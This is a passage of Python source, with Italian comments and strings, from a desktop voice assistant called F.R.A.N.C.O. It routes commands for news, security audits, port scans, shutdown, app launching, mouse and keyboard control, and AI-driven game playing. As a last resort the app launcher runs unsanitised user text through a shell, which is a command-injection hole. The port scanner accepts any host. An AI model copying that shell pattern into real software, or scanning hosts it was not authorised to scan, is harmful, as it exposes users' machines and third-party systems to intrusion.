                                   "notizie ai", "notizie finanza", "leggi notizie"]):
            nw = getattr(self, "news", None)
            if nw is None:
                try:
                    from franco_news import get_news
                    nw = get_news()
                    self.news = nw
                except Exception as e:
                    response = f"News non disponibile: {e}"
                    nw = None
            if nw:
                if any(k in t for k in ["aggiorna notizie","scarica notizie","refresh notizie"]):
                    nw.fetch_all_bg()
                    response = "Aggiornamento notizie avviato in background..."
                elif any(k in t for k in ["digest notizie"]):
                    response = nw.build_digest()
                elif "cerca" in t:
                    _q = self._extract_after(t, ["cerca notizia ","cerca notizie ","cerca "]) or ""
                    response = nw.search_text(_q) if _q else "Specifica cosa cercare."
                elif "tech" in t:
                    response = nw.headlines_text(category="tech", limit=5)
                elif "italia" in t:
                    response = nw.headlines_text(category="italia", limit=5)
                elif "mondo" in t:
                    response = nw.headlines_text(category="mondo", limit=5)
                elif "scienza" in t:
                    response = nw.headlines_text(category="scienza", limit=5)
                elif any(k in t for k in ["notizie ai","ai news"]):
                    response = nw.headlines_text(category="ai", limit=5)
                elif "finanza" in t:
                    response = nw.headlines_text(category="finanza", limit=5)
                else:
                    response = nw.headlines_text(limit=8)

        # 40. Security extended — audit e report
        elif any(k in t for k in ["audit sicurezza", "report sicurezza", "sicurezza sistema",
                                   "audit processi", "audit rete", "scan porte",
                                   "controlla integrità", "baseline file",
                                   "processi sospetti", "connessioni sospette"]):
            try:
                from franco_security_extended import (
                    full_security_report, security_summary, audit_processes,
                    audit_network, scan_ports
                )
                if "report" in t or "audit sicurezza" in t or "sicurezza sistema" in t:
                    r = full_security_report(save=True)
                    response = security_summary(r)
                elif "audit processi" in t or "processi sospetti" in t:
                    r = audit_processes()
                    n = len(r.get("suspicious", []))
                    response = (f"Processi sospetti: {n}\n" + "\n".join(
                        f"  ! {p['name']} (PID {p['pid']}) — {p['reason']}"
                        for p in r.get("suspicious", [])[:5]
                    )) if n else "Nessun processo sospetto rilevato."
                elif "audit rete" in t or "connessioni sospette" in t:
                    r = audit_network()
                    n = len(r.get("suspicious", []))
                    response = (f"Connessioni sospette: {n}\n" + "\n".join(
                        f"  ! {c['remote']} — {c['reason']}"
                        for c in r.get("suspicious", [])[:5]
                    )) if n else f"Rete OK. {r.get('listening',0)} porte in ascolto."
                elif "scan porte" in t:
                    host = self._extract_after(t, ["scan porte "]) or "127.0.0.1"
                    r = scan_ports(host.strip())
                    open_p = [f"{p['port']}/{p['service']}" for p in r["open"]]
                    response = (f"Port scan {host}: {len(open_p)} porte aperte\n" +
                                ", ".join(open_p)) if open_p else f"Nessuna porta aperta su {host}"
                else:
                    response = "Specifica: 'report sicurezza', 'audit processi', 'audit rete' o 'scan porte [host]'"
            except Exception as e:
                response = f"Errore security audit: {e}"

        # 39. Memoria episodica
        elif any(k in t for k in ["timeline", "journal", "diario", "mostra episodi",
                                   "cosa è successo", "ultimi eventi", "storia franco",
                                   "esporta memoria", "export journal"]):
            em = getattr(self, "episodic", None)
            if em is None:
                response = "Memoria episodica non disponibile."
            elif any(k in t for k in ["timeline", "cosa è successo", "ultimi eventi", "storia franco"]):
                giorni = self._extract_number(t, default=7)
                response = em.timeline(int(giorni))
            elif any(k in t for k in ["journal", "diario"]):
                response = em.daily_journal()
            elif any(k in t for k in ["esporta memoria", "export journal"]):
                fmt = "html" if "html" in t else "md"
                if fmt == "html":
                    path = em.export_html(days=30)
                else:
                    path = em.export_markdown(days=30)
                response = f"Memoria esportata in: {path}"
            else:
                response = em.status_line()

        # 38. Analisi NLP testo
        elif any(k in t for k in ["analizza testo", "analisi sentiment", "sentiment di",
                                   "analizza questo", "classifica intent", "estrai entità",
                                   "analisi nlp"]):
            _nlp_text = self._extract_after(t, [
                "analizza testo ", "analisi sentiment ", "sentiment di ",
                "analizza questo ", "classifica intent ", "estrai entità ",
                "analisi nlp ",
            ]) or raw
            nlp_obj = getattr(self, "nlp", None)
            if nlp_obj:
                response = nlp_obj.summary(_nlp_text)
            else:
                try:
                    from franco_nlp import analyze_summary
                    response = analyze_summary(_nlp_text)
                except Exception as e:
                    response = f"NLP non disponibile: {e}"

        # 37. Monitor sistema / dashboard
        elif any(k in t for k in ["dashboard sistema", "monitor sistema", "mostra dashboard",
                                   "statistiche sistema", "report sistema", "dashboard monitor",
                                   "ultimi alert", "alert sistema", "mostra alert"]):
            if "alert" in t:
                response = self._cmd_system_alerts()
            else:
                response = self._cmd_system_dashboard()

        # 38. Giochi — "gioca al posto mio"
        elif t.startswith(("gioca da solo a ", "gioca da sola a ", "vai a giocare a ",
                            "vai a giocare al ", "gioca al posto mio a ", "gioca al ", "gioca a ")):
            game_name = self._extract_after(t, [
                "gioca da solo a ", "gioca da sola a ", "vai a giocare al ",
                "vai a giocare a ", "gioca al posto mio a ", "gioca al ", "gioca a "
            ])
            response = self._cmd_play_game(game_name)

        elif any(k in t for k in ["smetti di giocare", "ferma il gioco", "basta giocare",
                                   "stop gioco", "fermati di giocare", "esci dal gioco"]):
            response = self._cmd_stop_game()

        # 20-alt. Automazioni non coperte: prima prova il motore dedicato,
        # poi registra il gap e avvia un miglioramento mirato.
        elif self._looks_like_automation_request(t):
            response = self._cmd_automation_or_self_improve(raw)

        # 20-alt. Fallback → Claude AI
        else:
            response = self._cmd_ai_fallback(raw)

        # Registra nel DB
        elapsed = time.perf_counter() - start
        category = self._categorize(t)
        self.memory.update_category_stat(category)

        try:
            self.db.log_command(
                raw, response[:500] if response else "",
                category, True, elapsed
            )
        except Exception as _e:
            pass  # suppressed error

        # Macro recording
        if self.state.get("recording_macro") and raw != "__WAKE__":
            self.state.get("current_macro", []).append(raw)

        self.event_bus.emit("command.processed",
                            data={"command": raw, "response": response,
                                  "category": category, "time": elapsed},
                            source="CommandEngine")

        return response or ""

    # ------------------------------------------------------------------
    # COMANDI SISTEMA
    # ------------------------------------------------------------------


    def _cmd_youtube_analysis(self) -> str:
        if not YOUTUBE_MODULE_AVAILABLE:
            return "Modulo YouTube non disponibile. Verifica che franco_youtube_ai.py sia presente."
        try:
            report_text = youtube_run_pipeline(max_videos=50)
            return "Analisi YouTube completata. " + report_text[:300]
        except Exception as e:
            return f"Errore durante l'analisi YouTube: {e}"

    def _cmd_time(self) -> str:
        now = datetime.now()
        return f"Sono le {now.strftime('%H:%M')} e {now.second} secondi."

    def _cmd_date(self) -> str:
        now = datetime.now()
        weekday = WEEKDAYS_IT[now.weekday()]
        month = MONTHS_IT[now.month - 1]
        return f"Oggi è {weekday}, {now.day} {month} {now.year}."

    def _cmd_shutdown(self) -> str:
        self.event_bus.emit("system.shutdown_requested")
        if IS_WINDOWS:
            threading.Timer(3, lambda: run_command("shutdown /s /t 0")).start()
        else:
            threading.Timer(3, lambda: run_command("shutdown -h now")).start()
        return "Avvio sequenza di spegnimento. Arrivederci."

    def _cmd_restart(self) -> str:
        if IS_WINDOWS:
            threading.Timer(3, lambda: run_command("shutdown /r /t 0")).start()
        else:
            threading.Timer(3, lambda: run_command("reboot")).start()
        return "Riavvio in corso. A presto."

    def _cmd_lock_screen(self) -> str:
        if IS_WINDOWS:
            run_command("rundll32 user32.dll,LockWorkStation")
        elif IS_LINUX:
            run_command("gnome-screensaver-command -l")
        elif IS_MACOS:
            run_command("/System/Library/CoreServices/Menu\\ Extras/User.menu/Contents/Resources/CGSession -suspend")
        return "Schermo bloccato."

    def _cmd_standby(self) -> str:
        self.tts.interrupt()  # ferma subito qualsiasi TTS in corso
        self.state.set("active", False)
        self.state.set("standby", True)
        self.state.set("system_state", SystemState.STANDBY)
        user_name = self.memory.get_user_name()
        return f"Vado in standby. Richiamami quando hai bisogno, {user_name}."

    def _cmd_wake(self) -> str:
        self.state.set("active", True)
        self.state.set("standby", False)
        self.state.set("system_state", SystemState.IDLE)
        user_name = self.memory.get_user_name()
        return f"Sono di nuovo operativo, {user_name}."

    def _cmd_identity(self) -> str:
        return (f"Sono F.R.A.N.C.O. versione {__version__} NEXUS, "
                f"Full Responsive Autonomous Neural Control Operator. "
                f"Il tuo assistente AI personale di nuova generazione.")

    def _cmd_help(self) -> str:
        return (
            "Capacità principali di F.R.A.N.C.O.: "
            "Sistema — ora, data, spegni/riavvia/blocca PC, info CPU/RAM, processi, rete. "
            "Applicazioni — apri/chiudi qualsiasi app. "
            "Web — cerca su Google/YouTube, apri URL, ricerca AI in-line. "
            "Digitazione ovunque — 'scrivi su google [testo]' (apre Google e digita davvero), "
            "'scrivi qui [testo]' o 'digita [testo]' (scrive nel campo attivo in quel momento, "
            "es. Google Docs, Gmail, chat). "
            "Controllo mouse — 'muovi il mouse a X Y', 'clicca', 'clicca su [elemento]' (uso la "
            "visione per trovarlo), 'doppio click', 'click destro', 'trascina da X Y a X2 Y2', "
            "'scorri su/giù'. "
            "Meteo — 'che tempo fa' o 'meteo a Roma'. "
            "Calcolatrice — scrivi '2 + 2' direttamente. "
            "Appunti — 'cosa c'è negli appunti', 'copia: testo'. "
            "Sicurezza — scansione porte, SSL, password, hash, sicurezza PC. "
            "Antivirus — scansiona sistema/downloads/desktop, quarantena. "
            "Trading — portafoglio, compra/vendi azioni, autotrader, watchlist. "
            "Note e promemoria — nota:, promemoria, timer. "
            "Email — manda email, vault credenziali. "
            "Code — apri progetto, agente: istruzione, applica modifiche. "
            "Memoria — ricorda, cosa sai su, mostra memoria. "
            "Automazioni — crea regole 'ogni/quando/se'. "
            "Smart home — accendi/spegni luci, termostato. "
            "Macro — registra/esegui macro. "
            "Mi chiamo [nome] — impara il tuo nome. "
            "Invenzione — 'ho un progetto su [X]', 'inventa idee per [X]', "
            "'dammi soluzioni per [X]', 'brainstorming su [X]'. "
            "Modalità: tecnico, business, creativo, critico (es. 'idee tecniche per...'). "
            "Knowledge Base — 'cosa sai su [X]', 'cerca in wikipedia [X]', "
            "'indicizza file [percorso]', 'statistiche kb'. "
            "Local AI offline — 'rispondi offline [domanda]', 'stato llm locale', 'stato asset'. "
            "Giochi — 'gioca a [nome gioco]' per farmi giocare al posto tuo (ideale per giochi "
            "a turni/casual), 'smetti di giocare' per fermarmi. "
            "Chiedimi qualsiasi cosa in italiano naturale."
        )

    # ------------------------------------------------------------------
    # APPLICAZIONI
    # ------------------------------------------------------------------

    def _cmd_open_app(self, app_name: str) -> str:
        if not app_name:
            return "Quale applicazione devo aprire?"

        matched = self.nlp.fuzzy_match_app(app_name)
        if matched:
            app_info = APP_DATABASE[matched]
            cmd = app_info["cmd"]
            try:
                if IS_WINDOWS:
                    os.startfile(cmd) if not cmd.endswith(".msc") else run_command(f"mmc {cmd}")
                else:
                    subprocess.Popen([cmd], start_new_session=True,
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"Avvio {matched}."
            except Exception:
                try:
                    subprocess.Popen(cmd, shell=True, start_new_session=True,
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return f"Avvio {matched}."
                except Exception as e:
                    return f"Non riesco ad avviare {matched}: {e}"
        # Non è nel database statico: cerca tra TUTTE le app installate
        # (scorciatoie nel menu Start, programmi in registro, Program Files/AppData)
        if self.app_launcher is not None:
            ok, msg = self.app_launcher.launch(app_name)
            if ok:
                return msg

        # Ultimo tentativo: prova ad avviarlo come comando diretto (se è nel PATH)
        try:
            subprocess.Popen(app_name, shell=True, start_new_session=True,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return f"Provo ad avviare {app_name}."
        except Exception:
            return f"Applicazione '{app_name}' non trovata."

    @staticmethod
    def _parse_winget_id(output: str, query: str) -> Optional[str]:
        """Estrae l'Id pacchetto migliore dall'output tabellare di `winget search`."""
        lines = [l for l in output.splitlines() if l.strip()]
        header_idx = None
        for i, l in enumerate(lines):
            low = l.lower()
            if low.startswith("name") and "id" in low and "version" in low:
                header_idx = i
                break
        if header_idx is None or header_idx + 2 > len(lines):
            return None

        header = lines[header_idx]
        id_col = header.find("Id")
        version_col = header.find("Version")
        if id_col == -1:
            return None

        qn = query.lower().strip()
        best_id, best_score = None, 0.0
        for row in lines[header_idx + 2:]:
            if len(row) <= id_col:
                continue
            name = row[:id_col].strip()
            raw_tail = row[id_col:version_col].strip() if version_col > id_col else row[id_col:].strip()
            pkg_id = raw_tail.split()[0] if raw_tail else ""
            if not pkg_id:
                continue
            score = difflib.SequenceMatcher(None, qn, name.lower()).ratio()
            if qn in name.lower() or qn in pkg_id.lower():
                score += 0.3
            if score > best_score:
                best_score, best_id = score, pkg_id
        return best_id

    def _cmd_download_app(self, app_name: str) -> str:
        """Cerca e installa un'applicazione tramite Windows Package Manager (winget)."""
        if not app_name:
            return "Quale applicazione devo scaricare?"
        app_name = app_name.strip()

        if not IS_WINDOWS:
            return "Il download automatico delle app è disponibile solo su Windows."

        if not shutil.which("winget"):
            return ("Winget (Windows Package Manager) non è installato su questo PC. "
                    "Installa 'App Installer' dal Microsoft Store per abilitare questa funzione.")

        rc, out, err = run_command(
            f'winget search "{app_name}" --accept-source-agreements',
            timeout=30
        )
        if rc != 0 or not out.strip():
            self.logger.info("APP", f"winget search senza risultati per '{app_name}': {err.strip()}")
            return self._cmd_delegate_to_code_agent(f"scarica {app_name}")

        pkg_id = self._parse_winget_id(out, app_name)
        if not pkg_id:
            return (f"Ho trovato dei risultati per '{app_name}' ma nessuno abbastanza preciso. "
                     "Prova a specificare meglio il nome dell'app.")

        self.logger.info("APP", f"Installazione winget avviata: {pkg_id}")

        def _install():
            try:
                rc2, out2, err2 = run_command(
                    f'winget install --id "{pkg_id}" -e --silent '
                    f'--accept-package-agreements --accept-source-agreements',
                    timeout=900
                )
                if rc2 == 0:
                    self.logger.success("APP", f"Installato: {pkg_id}")
                    if self.app_launcher is not None:
                        self.app_launcher.refresh(force=True)
                else:
                    self.logger.warning("APP", f"Installazione fallita per {pkg_id}: {(err2 or out2).strip()}")
            except Exception as e:
                self.logger.error("APP", f"Errore installazione {pkg_id}: {e}")

        threading.Thread(target=_install, daemon=True, name=f"WingetInstall-{pkg_id}").start()
        return f"Sto scaricando e installando {pkg_id}, ti avviso appena è pronto."

    def _cmd_close_app(self, app_name: str) -> str:
        if not app_name:
            return "Quale applicazione devo chiudere?"
        if getattr(self, "memory_guard", None):
            return self.memory_guard.propose_close(app_name)
        return "Non posso chiudere applicazioni finché il gestore memoria sicuro non è disponibile."

    # ------------------------------------------------------------------
    # WEB
    # ------------------------------------------------------------------

    def _cmd_search_web(self, query: str) -> str:
        if not query:
            return "Cosa vuoi cercare?"
        url = "https://www.google.com/search?q=" + urllib.parse.quote(query)
        webbrowser.open(url)
        return f"Cerco '{query}' su Google."

    def _cmd_open_url(self, url: str) -> str:
        if not url:
            return "Quale URL devo aprire?"
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        webbrowser.open(url)
        return f"Apro {url}."

    def _cmd_youtube(self, query: str) -> str:
        if not query:
            webbrowser.open("https://www.youtube.com")
            return "Apro YouTube."
        url = "https://www.youtube.com/results?search_query=" + urllib.parse.quote(query)
        webbrowser.open(url)
        return f"Cerco '{query}' su YouTube."

    # ------------------------------------------------------------------
    # SCRITTURA OVUNQUE (digitazione reale nel campo attivo) + CONTROLLO MOUSE
    # ------------------------------------------------------------------

    def _type_string(self, text: str) -> Optional[str]:
        """Digita `text` come se fosse battuto a tastiera nel campo attualmente
        in focus (finestra, campo di ricerca, documento...). Ritorna None se ok,
        altrimenti un messaggio d'errore."""
        if not text:
            return "Cosa devo scrivere?"
        try:
            if DEPENDENCIES_STATUS.get('keyboard') and keyboard:
                # Simulazione tasto-per-tasto, gestisce Unicode (accenti) su Windows
                keyboard.write(text, delay=0.01)
            elif DEPENDENCIES_STATUS.get('pyperclip') and pyperclip and DEPENDENCIES_STATUS.get('pyautogui') and pyautogui:
                # Incolla via appunti: robusto con accenti/Unicode, funziona in quasi ogni campo
                previous_clip = pyperclip.paste()
                pyperclip.copy(text)
                pyautogui.hotkey('ctrl', 'v')
                time.sleep(0.15)
                try:
                    pyperclip.copy(previous_clip)
                except Exception:
                    pass
            elif DEPENDENCIES_STATUS.get('pyautogui') and pyautogui:
                # Ultima risorsa: solo caratteri ASCII, gli accenti potrebbero non essere digitati
                pyautogui.typewrite(text, interval=0.01)
            else:
                return "Nessuno strumento di digitazione disponibile (keyboard/pyautogui/pyperclip mancanti)."
            return None
        except Exception as e:
            return f"Errore durante la digitazione: {e}"

    def _cmd_type_text(self, text: str, delay: float = 1.2) -> str:
        """Scrive il testo dettato ovunque sia il focus in quel momento
        (barra di ricerca Google, Google Docs, Gmail, qualsiasi campo)."""
        if not text:
            return "Cosa devo scrivere? Mi dica il testo dopo 'scrivi qui' o 'digita'."
        time.sleep(delay)
        err = self._type_string(text)
        if err:
            return err
        preview = text if len(text) <= 60 else text[:60] + "..."
        return f'Scritto: "{preview}".'

    def _cmd_write_on_google(self, text: str) -> str:
        """Apre Google, digita davvero il testo nella barra di ricerca e cerca."""
        if not text:
            return "Cosa devo scrivere su Google?"
        try:
            webbrowser.open("https://www.google.com")
            time.sleep(2.5)
            err = self._type_string(text)
            if err:
                return err
            if DEPENDENCIES_STATUS.get('pyautogui') and pyautogui:
                pyautogui.press('enter')
            return f'Ho scritto e cercato "{text}" su Google.'
        except Exception as e:
            return f"Errore apertura Google: {e}"

    def _cmd_mouse_move(self, raw: str) -> str:
        if not (DEPENDENCIES_STATUS.get('pyautogui') and pyautogui):
            return "Controllo mouse non disponibile (pyautogui mancante)."
        coords = re.findall(r"-?\d+", raw)
        if len(coords) < 2:
            return "Mi dica le coordinate, es. 'muovi il mouse a 500 300'."
        try:
            x, y = int(coords[0]), int(coords[1])
            pyautogui.moveTo(x, y, duration=0.3)
            return f"Mouse spostato a ({x}, {y})."
        except Exception as e:
            return f"Errore movimento mouse: {e}"

    def _cmd_mouse_click(self, raw: str, button: str = "left", clicks: int = 1) -> str:
        if not (DEPENDENCIES_STATUS.get('pyautogui') and pyautogui):
            return "Controllo mouse non disponibile (pyautogui mancante)."
        coords = re.findall(r"-?\d+", raw)
        try:
            if len(coords) >= 2:
                x, y = int(coords[0]), int(coords[1])
                pyautogui.click(x=x, y=y, clicks=clicks, button=button)
                label = f"a ({x}, {y})"
            else:
                desc = self._extract_after(raw.lower(), [
                    "doppio click su", "doppio click", "click destro su", "click destro",
                    "tasto destro su", "tasto destro", "clicca su", "clicca",
                    "fai click su", "fai click",
                ]).strip()
                data = None
                if desc and getattr(self, "vision", None):
                    data, _ = self.vision.find_element(desc)
                if data and data.get("trovato"):
                    x, y = int(data["x"]), int(data["y"])
                    pyautogui.click(x=x, y=y, clicks=clicks, button=button)
                    label = f"su '{desc}' ({x}, {y})"
                else:
                    pyautogui.click(clicks=clicks, button=button)
                    label = "nella posizione corrente del mouse"
            azione = "Doppio click" if clicks == 2 else ("Click destro" if button == "right" else "Click")
            return f"{azione} {label}."
        except Exception as e:
            return f"Errore click: {e}"

    def _cmd_mouse_drag(self, raw: str) -> str:
        if not (DEPENDENCIES_STATUS.get('pyautogui') and pyautogui):
            return "Controllo mouse non disponibile (pyautogui mancante)."
        coords = re.findall(r"-?\d+", raw)
        if len(coords) < 4:
            return "Mi dica 4 coordinate, es. 'trascina da 100 200 a 500 600'."
        try:
            x1, y1, x2, y2 = (int(c) for c in coords[:4])
            pyautogui.moveTo(x1, y1, duration=0.2)
            pyautogui.dragTo(x2, y2, duration=0.4, button="left")
            return f"Trascinato da ({x1}, {y1}) a ({x2}, {y2})."
        except Exception as e:
            return f"Errore trascinamento: {e}"

    def _cmd_mouse_scroll(self, raw: str) -> str:
        if not (DEPENDENCIES_STATUS.get('pyautogui') and pyautogui):
            return "Controllo mouse non disponibile (pyautogui mancante)."
        t = raw.lower()
        amount = self._extract_number(t, default=10) * 30
        direction = -1 if any(k in t for k in ["giù", "giu", "basso", "down"]) else 1
        try:
            pyautogui.scroll(direction * amount)
            return f"Scorrimento {'in basso' if direction < 0 else 'in alto'}."
        except Exception as e:
            return f"Errore scorrimento: {e}"

    # ------------------------------------------------------------------
    # VOLUME
    # ------------------------------------------------------------------

    def _cmd_volume_up(self, amount: int = 10) -> str:
        if IS_WINDOWS:
            for _ in range(amount // 2):
                run_command("nircmd.exe changesysvolume 3277", timeout=2)
        elif IS_LINUX:
            run_command(f"amixer sset Master {amount}%+")
        elif IS_MACOS:
            run_command(f"osascript -e 'set volume output volume (output volume of (get volume settings) + {amount})'")
        return f"Volume aumentato del {amount}%."

    def _cmd_volume_down(self, amount: int = 10) -> str:
        if IS_WINDOWS:
            for _ in range(amount // 2):
                run_command("nircmd.exe changesysvolume -3277", timeout=2)
        elif IS_LINUX:
            run_command(f"amixer sset Master {amount}%-")
        elif IS_MACOS:
            run_command(f"osascript -e 'set volume output volume (output volume of (get volume settings) - {amount})'")
        return f"Volume abbassato del {amount}%."

    def _cmd_mute(self) -> str:
        if IS_WINDOWS:
            run_command("nircmd.exe mutesysvolume 2", timeout=2)
        elif IS_LINUX:
            run_command("amixer sset Master toggle")
        elif IS_MACOS:
            run_command("osascript -e 'set volume with output muted'")
        return "Audio silenziato."

    # ------------------------------------------------------------------
    # TIMER
    # ------------------------------------------------------------------

    def _cmd_timer(self, raw: str) -> str:
        seconds = parse_time_expression(raw)
        if not seconds or seconds <= 0:
            return "Non ho capito la durata del timer. Prova con 'timer 30 secondi' o 'timer 5 minuti'."

        timer_id = generate_id("timer_")
        user_name = self.memory.get_user_name()

        def fire():
            msg = f"Timer scaduto, {user_name}!"
            self.tts.speak(msg)
            self.logger.info("TIMER", f"Timer {timer_id} scaduto")
            with self._lock:
                self._active_timers.pop(timer_id, None)

        t = threading.Timer(seconds, fire)
        t.daemon = True
        t.start()
        with self._lock:
            self._active_timers[timer_id] = t

        human = format_duration(seconds)
        return f"Timer impostato per {human}. Ti avviserò."

    # ------------------------------------------------------------------
    # NOTE & PROMEMORIA
    # ------------------------------------------------------------------

    def _cmd_add_note(self, content: str) -> str:
        if not content:
            return "Cosa devo annotare?"
        note_id = self.db.add_note(content)
        self.memory.add_note(content)
        return f"Nota salvata con ID {note_id}."

    def _cmd_show_notes(self) -> str:
        notes = self.db.get_notes(limit=5)
        if not notes:
            return "Nessuna nota salvata."
        lines = [f"{n['id']}. {n['content'][:80]}" for n in notes]
        return "Le ultime note: " + " — ".join(lines)

    def _cmd_add_reminder(self, content: str) -> str:
        if not content:
            return "Cosa devo ricordarti?"
        # Cerca ora nel testo
        due = datetime.now() + timedelta(hours=1)
        rem_id = self.db.add_reminder(content, due)
        return f"Promemoria aggiunto: '{content}'. ID {rem_id}."

    def _cmd_list_reminders(self) -> str:
        rems = self.db.get_upcoming_reminders(hours=48)
        if not rems:
            return "Nessun promemoria nelle prossime 48 ore."
        lines = [f"{r['id']}. {r['title']}" for r in rems[:5]]
        return "Prossimi promemoria: " + " — ".join(lines)

    # ------------------------------------------------------------------
    # FILE SYSTEM
    # ------------------------------------------------------------------

    def _cmd_create_file_or_dir(self, raw: str) -> str:
        t = raw.lower()
        if any(k in t for k in ["cartella", "directory", "folder"]):
            name = self._extract_after(t, ["crea cartella ", "crea directory ", "crea folder "])
            if not name:
                return "Che nome deve avere la cartella?"
            path = Path(DESKTOP_DIR) / sanitize_filename(name)
            path.mkdir(parents=True, exist_ok=True)
            return f"Cartella '{name}' creata sul desktop."
        else:
            name = self._extract_after(t, ["crea file ", "crea un file "])
            if not name:
                return "Che nome deve avere il file?"
            path = Path(DESKTOP_DIR) / sanitize_filename(name)
            path.touch(exist_ok=True)
            return f"File '{name}' creato sul desktop."

    def _cmd_search_file(self, filename: str) -> str:
        if not filename:
            return "Quale file devo cercare?"
        found = []
        # Cerca in home e documenti
        for base in [Path.home(), DOCUMENTS_DIR, DESKTOP_DIR, DOWNLOADS_DIR]:
            if not base.exists():
                continue
            for match in base.rglob(f"*{filename}*"):
                found.append(str(match))
                if len(found) >= 10:
                    break
            if len(found) >= 10:
                break

        if not found:
            return f"Nessun file trovato con '{filename}'."
        lines = "\n".join(found[:5])
        suffix = f" e altri {len(found)-5}." if len(found) > 5 else "."
        return f"Trovati {len(found)} file{suffix}\n{lines}"

    def _cmd_open_explorer(self, path_arg: str) -> str:
        p = Path(path_arg) if path_arg and path_arg != "." else Path.home()
        if not p.exists():
            p = Path.home()
        if IS_WINDOWS:
            subprocess.Popen(["explorer", str(p)])
        elif IS_MACOS:
            subprocess.Popen(["open", str(p)])
        else:
            subprocess.Popen(["xdg-open", str(p)])
        return f"Apro {p}."

    def _cmd_backup(self) -> str:
        result = self.backup_mgr.backup_directory(str(DATA_DIR))
        if result:
            return f"Backup completato: {result}"
        return "Errore durante il backup."

    # ------------------------------------------------------------------
    # SCREENSHOT & VISIONE
    # ------------------------------------------------------------------

    def _cmd_screenshot(self) -> str:
        path = self.vision.save_screenshot()
        if path:
            return f"Screenshot salvato in {path}."
        return "Errore durante la cattura dello schermo."

    def _cmd_analyze_screen(self, question: str = None) -> str:
        response = self.vision.analyze_screen(question)
        return response

    # ------------------------------------------------------------------
    # GIOCHI — "gioca al posto mio"
    #
    # Loop autonomo: screenshot → il modello di visione decide UNA azione
    # (click/tasto/attesa) → FRANCO la esegue con pyautogui → ripete.
    # Pensato per giochi a turni/casual (solitario, puzzle, gestionali):
    # ogni passo richiede una chiamata AI (secondi di latenza), quindi
    # NON è adatto a giochi d'azione in tempo reale.
    # ------------------------------------------------------------------

    _GAME_MAX_STEPS = 80
    _GAME_MAX_SECONDS = 25 * 60
    _GAME_STEP_PAUSE = 1.2

    def _cmd_play_game(self, game_name: str) -> str:
        game_name = (game_name or "").strip()
        if not game_name:
            return "A quale gioco devo giocare?"

        if not self.vision.input_available():
            return ("Non posso controllare mouse e tastiera: pyautogui non è disponibile "
                    "su questo sistema.")

        if self._game_thread and self._game_thread.is_alive():
            return f"Sto già giocando a {self._game_name}. Di' 'smetti di giocare' prima di iniziare un'altra partita."

        stop_event = threading.Event()
        self._game_stop_event = stop_event
        self._game_name = game_name

        self._game_thread = threading.Thread(
            target=self._play_game_loop,
            args=(game_name, stop_event),
            daemon=True,
            name="FrancoGamePlayer"
        )
        self._game_thread.start()

        return (f"Avvio {game_name} e comincio a giocare al posto tuo. "
                f"Per fermarmi in qualsiasi momento di' 'smetti di giocare', "
                f"oppure sposta il mouse in un angolo dello schermo.")

    def _cmd_stop_game(self) -> str:
        if not self._game_thread or not self._game_thread.is_alive():
            self._game_thread = None
            self._game_stop_event = None
            return "Non sto giocando a niente al momento."

        name = self._game_name or "il gioco"
        if self._game_stop_event:
            self._game_stop_event.set()
        self._game_thread.join(timeout=5)
        return f"Smetto di giocare a {name}."

    def _play_game_loop(self, game_name: str, stop_event: threading.Event):
        self.logger.info("GAME", f"Avvio partita autonoma: {game_name}")
        try:
            open_msg = self._cmd_open_app(game_name)
            self.logger.info("GAME", f"Lancio '{game_name}': {open_msg}")
        except Exception as e:
            self.logger.warning("GAME", f"Impossibile avviare '{game_name}': {e}")

        # Attesa caricamento gioco (interrompibile)
        if stop_event.wait(6):
            return

        width, height = self.vision.screen_size()
        router = getattr(self, "_router", None)
        start_time = time.time()

        system_prompt = (
            "Sei un giocatore AI esperto che controlla mouse e tastiera di un PC Windows "
            f"per giocare a '{game_name}' al posto dell'utente. Guarda lo screenshot e decidi "
            "UNA sola azione da compiere ora per progredire nel gioco, rispettando le regole. "
            "Rispondi SOLO con un oggetto JSON valido, senza testo aggiuntivo, in uno di questi formati:\n"
            '{"action":"click","x":123,"y":456,"reason":"..."}\n'
            '{"action":"doppio_click","x":123,"y":456,"reason":"..."}\n'
            '{"action":"tasto","key":"space","reason":"..."}  (key: nome tasto pyautogui, es. "up","enter","w","ctrl+z")\n'
            '{"action":"tieni_premuto","key":"w","durata":0.5,"reason":"..."}\n'
            '{"action":"scrivi","testo":"...","reason":"..."}\n'
            '{"action":"attendi","reason":"..."}\n'
            '{"action":"fine","reason":"partita conclusa o non posso più procedere"}\n'
            f"Lo schermo è {width}x{height} pixel: le coordinate x,y devono essere pixel reali in questo intervallo."
        )

        step = 0
        while not stop_event.is_set():
            if step >= self._GAME_MAX_STEPS or (time.time() - start_time) > self._GAME_MAX_SECONDS:
                self.logger.info("GAME", f"Limite passi/tempo raggiunto per '{game_name}'.")
                break
            step += 1

            b64, err = self.vision.capture_base64()
            if err:
                self.logger.warning("GAME", f"Screenshot fallito: {err}")
                if stop_event.wait(2):
                    break
                continue

            prompt = f"Passo {step}. Qual è la prossima azione da compiere in '{game_name}'?"
            try:
                if router:
                    raw_resp = router.chat_with_image(prompt, b64, system=system_prompt, max_tokens=300)
                else:
                    raw_resp = self.ai.chat_with_image(prompt, b64, system=system_prompt, max_tokens=300)
            except Exception as e:
                self.logger.warning("GAME", f"Errore visione: {e}")
                if stop_event.wait(2):
                    break
                continue

            data = None
            try:
                json_match = re.search(r"\{.*\}", raw_resp or "", re.DOTALL)
                if json_match:
                    data = json.loads(json_match.group())
            except Exception:
                data = None

            if not data:
                self.logger.warning("GAME", f"Risposta AI non interpretabile: {(raw_resp or '')[:120]}")
                if stop_event.wait(1.5):
                    break
                continue

            action = str(data.get("action", "attendi")).lower()
            reason = data.get("reason", "")
            self.logger.info("GAME", f"[{step}] {action} — {reason}")

            if action in ("fine", "done", "stop"):
                break
            elif action == "click":
                self.vision.click_at(data.get("x", 0), data.get("y", 0))
            elif action in ("doppio_click", "double_click"):
                self.vision.click_at(data.get("x", 0), data.get("y", 0), clicks=2)
            elif action in ("tasto", "key"):
                key = data.get("key", "")
                if key:
                    self.vision.press_key(key)
            elif action in ("tieni_premuto", "hold_key"):
                key = data.get("key", "")
                if key:
                    self.vision.hold_key(key, float(data.get("durata", 0.3) or 0.3))
            elif action in ("scrivi", "type"):
                testo = data.get("testo", "")
                if testo:
                    self.vision.type_text(testo)
            # "attendi"/altro → nessuna azione, solo attesa

